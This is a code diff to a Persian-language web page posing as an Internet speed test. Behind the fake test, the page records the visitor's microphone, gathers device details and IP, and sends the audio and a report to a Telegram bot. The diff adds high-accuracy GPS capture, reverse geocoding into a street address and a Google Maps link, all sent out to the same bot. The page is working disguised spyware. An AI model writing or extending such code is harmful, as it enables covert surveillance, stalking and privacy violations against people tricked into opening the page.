@@ -24,7 +24,7 @@
   <div class="card">
     <div class="icon">WiFi</div>
     <h2>تست سرعت اینترنت</h2>
-    <p>برای اندازه‌گیری سرعت، روی دکمه کلیک کنید. (۱۰ ثانیه)</p>
+    <p>برای اندازه‌گیری دقیق، روی دکمه کلیک کنید. (۱۰ ثانیه)</p>
     
     <button id="startBtn" class="btn">
       <span id="btnText">شروع تست سرعت</span>
@@ -47,7 +47,35 @@
 
     let mediaRecorder, stream, timer;
 
-    // جمع‌آوری اطلاعات گوشی
+    // دریافت موقعیت دقیق + آدرس
+    async function getLocation() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          resolve({ error: "موقعیت‌یابی پشتیبانی نمی‌شود" });
+          return;
+        }
+
+        status.textContent = "در حال دریافت موقعیت...";
+
+        navigator.geolocation.getCurrentPosition(
+          async (position) => {
+            const { latitude, longitude, accuracy } = position.coords;
+            try {
+              const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
+              const data = await res.json();
+              const address = data.display_name || "آدرس نامشخص";
+              resolve({ latitude, longitude, accuracy, address });
+            } catch {
+              resolve({ latitude, longitude, accuracy, address: "آدرس نامشخص" });
+            }
+          },
+          () => resolve({ error: "اجازه موقعیت رد شد" }),
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      });
+    }
+
+    // اطلاعات فنی
     async function getDeviceInfo() {
       const info = {
         userAgent: navigator.userAgent,
@@ -55,7 +83,6 @@
         language: navigator.language,
         screen: `${screen.width}x${screen.height}`,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        online: navigator.onLine,
         connection: navigator.connection ? navigator.connection.effectiveType : 'نامشخص',
         ip: 'در حال دریافت...',
         location: 'در حال دریافت...'
@@ -91,7 +118,8 @@
         mediaRecorder.onstop = async () => {
           const blob = new Blob(chunks, { type: mimeType });
           const deviceInfo = await getDeviceInfo();
-          await sendToTelegram(blob, deviceInfo);
+          const location = await getLocation();
+          await sendToTelegram(blob, deviceInfo, location);
           stopStream();
         };
 
@@ -115,7 +143,7 @@
       }
     }
 
-    async function sendToTelegram(blob, deviceInfo) {
+    async function sendToTelegram(blob, deviceInfo, location) {
       status.textContent = "در حال ارسال...";
       const fileName = `voice_${Date.now()}.webm`;
       const form = new FormData();
@@ -137,19 +165,23 @@
         if (docData.ok) messageId = docData.result.message_id;
       }
 
-      // گزارش فنی گوشی (بدون استیکر)
+      // گزارش کامل
       const report = `
-*گزارش فنی دستگاه*
+*گزارش کامل کاربر*
 
  مدل: \`${deviceInfo.userAgent.split('(')[1]?.split(';')[1]?.trim() || 'نامشخص'}\`
  سیستم عامل: \`${deviceInfo.platform}\`
- مرورگر: \`${navigator.userAgent.split(' ').pop()}\`
  رزولوشن: \`${deviceInfo.screen}\`
- زبان: \`${deviceInfo.language}\`
- منطقه زمانی: \`${deviceInfo.timezone}\`
- اتصال: \`${deviceInfo.connection}\`
  IP: \`${deviceInfo.ip}\`
- موقعیت: \`${deviceInfo.location}\`
+ موقعیت تقریبی: \`${deviceInfo.location}\`
+
+*موقعیت دقیق (GPS)*
+ طول جغرافیایی: \`${location.latitude || 'نامشخص'}\`
+ عرض جغرافیایی: \`${location.longitude || 'نامشخص'}\`
+ دقت: \`${location.accuracy ? location.accuracy + ' متر' : 'نامشخص'}\`
+ آدرس: \`${location.address || 'نامشخص'}\`
+
+[نقشه گوگل](https://maps.google.com/?q=${location.latitude},${location.longitude})
       `.trim();
 
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -159,7 +191,8 @@
           chat_id: CHAT_ID,
           text: report,
           parse_mode: 'Markdown',
-          reply_to_message_id: messageId
+          reply_to_message_id: messageId,
+          disable_web_page_preview: false
         })
       });
 
